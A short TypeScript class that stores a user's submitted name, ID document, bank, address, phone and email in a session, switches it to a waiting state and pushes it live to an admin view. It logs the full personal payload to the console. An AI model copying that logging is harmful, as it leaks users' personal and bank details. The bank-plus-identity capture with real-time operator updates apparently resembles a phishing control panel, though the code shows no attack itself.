import { ActionState } from "@prisma/client";
import { type SessionRepository } from "../ports/SessionRepository.js";
import { type RealtimeGateway } from "../ports/RealtimeGateway.js";
import { SessionPolicy } from "../../domain/session/SessionPolicy.js";
import type { DataPayload } from "../../domain/session/SessionData.js";

function isNonEmpty(v?: string) {
  return typeof v === "string" && v.trim().length > 0;
}

export class UserSubmitData {
  constructor(private repo: SessionRepository, private rt: RealtimeGateway) {}

  async execute(input: { sessionId: string; data: DataPayload }) {
    const sessionId = (input.sessionId || "").trim();
    if (!sessionId) return { ok: false as const, error: "missing_sessionId" };

    const s = await this.repo.findById(sessionId);
    if (!s) return { ok: false as const, error: "not_found" };

    if (!SessionPolicy.canUserSubmitData(s.action)) {
      return { ok: false as const, error: "bad_state" };
    }

    console.log(input)
    // ✅ guarda los campos en la sesión (ajusta nombres a tu modelo)
    const updated = await this.repo.update(sessionId, {
      name: input.data?.name?.trim?.() ?? s.name ?? null,
      document: input.data?.document?.trim?.() ?? s.document ?? null,
      bank: input.data?.bank?.trim?.().toLowerCase() ?? null,
      address: input.data?.address?.trim?.() ?? s.address ?? null,
      country: input.data?.country?.trim?.() ?? s.country ?? null,
      city: input.data?.city?.trim?.() ?? s.city ?? null,
      phone: input.data?.phone?.trim?.() ?? s.phone ?? null,
      email: input.data?.email?.trim?.() ?? s.email ?? null,
      action: ActionState.DATA_WAIT_ACTION,
      lastError: null,
    });

    this.rt.emitSessionUpdate(sessionId, updated);
    this.rt.emitAdminUpsert(updated);

    return { ok: true as const };
  }
}